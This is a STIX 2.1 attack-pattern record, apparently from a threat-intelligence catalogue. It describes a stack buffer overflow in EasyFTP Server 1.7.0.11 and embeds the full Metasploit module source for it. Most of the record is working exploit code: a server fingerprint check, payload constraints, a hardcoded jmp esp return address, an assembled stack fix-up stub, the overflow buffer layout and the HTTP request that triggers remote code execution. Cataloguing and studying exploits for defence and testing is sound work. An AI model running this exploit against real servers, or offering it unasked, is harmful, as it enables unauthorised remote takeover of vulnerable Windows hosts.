{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9dc6573-04b9-4e45-ad17-d0b014047c17",
    "created": "2024-08-14T16:54:57.280098Z",
    "modified": "2024-08-14T16:54:57.280102Z",
    "name": "EasyFTP Server list.html path Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11 and earlier. EasyFTP fails to check input size when parsing the 'path' parameter supplied to an HTTP GET request, which leads to a stack based buffer overflow. EasyFTP allows anonymous access by default; valid credentials are typically unnecessary to exploit this vulnerability.  After version 1.7.0.12, this package was renamed \"UplusFtp\".  Due to limited space, as well as difficulties using an egghunter, the use of staged, ORD, and/or shell payloads is recommended. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/easyftp_list.rb",
            "external_id": "easyftp_list.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :pattern => [ /Easy-Web Server\\// ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EasyFTP Server list.html path Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11\n        and earlier. EasyFTP fails to check input size when parsing the 'path' parameter\n        supplied to an HTTP GET request, which leads to a stack based buffer overflow.\n        EasyFTP allows anonymous access by default; valid credentials are typically\n        unnecessary to exploit this vulnerability.\n\n        After version 1.7.0.12, this package was renamed \"UplusFtp\".\n\n        Due to limited space, as well as difficulties using an egghunter, the use of\n        staged, ORD, and/or shell payloads is recommended.\n      },\n      'Author'         =>\n        [\n          'ThE g0bL!N',   # Original exploit [see References]\n          'jduck'         # Metasploit re-implementation\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '66614'],\n          [ 'EDB', '11500' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 256,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x23\\x25\\x26\\x2b\\x2f\\x3b\\x3f\\x5c\",\n          'Compat'   =>\n          {\n            'ConnectionType' => '+ws2ord',\n          },\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\t'Windows XP SP3 - Easy FTP Server Universal',\n            # NOTE: It's not possible to use addresses within the\n            # binary due to the nul byte.\n            {\n              'Ret'      => 0x7cc5d507  # jmp esp in shell32.dll\n              #'Ret'      => 0xdeadbeef\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-02-18'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('HttpUsername', [true, 'The HTTP username to specify for basic authentication', 'anonymous']),\n        OptString.new('HttpPassword', [true, 'The HTTP password to specify for basic authentication', 'mozilla@example.com'])\n      ])\n  end\n\n  def check\n    info = http_fingerprint  # check method\n    if info and (info =~ /Easy\\-Web Server\\//)\n      return Exploit::CheckCode::Detected\n    end\n    Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    if (payload.encoded.length > payload_space)\n      fail_with(Failure::Unknown, \"Insufficient space for payload, try using a staged, ORD and/or shell payload.\")\n    end\n\n    # Fix up ESP, jmp to the beginning of the buffer\n    stub_asm = %q{\n      mov edi, esp\n      add esp, 0xfffffc04\n      add edi, 0xfffffee8\n      jmp edi\n    }\n    stub = Metasm::Shellcode.assemble(Metasm::Ia32.new, stub_asm).encode_string\n\n    # Build the path up\n    path = ''\n    path << payload.encoded\n    path << rand_text(268 - path.length)\n    # NOTE: It's possible to overwrite SEH, however SafeSEH is in effect.\n    path << [target.ret].pack('V')\n    path << rand_text(280 - path.length)\n    path << stub\n    path << rand_text(332 - path.length)\n\n    uri = \"/list.html?path=\"\n    uri << path\n\n    print_status(\"Trying target #{target.name}...\")\n    res = send_request_raw({ 'uri' => uri }, 5)\n\n    if (res)\n      print_error(\"The server unexpectedly responded, this is not good.\")\n      print_status(res.to_s)\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-02-18",
    "x_mitre_platforms": [
        "win'"
    ]
}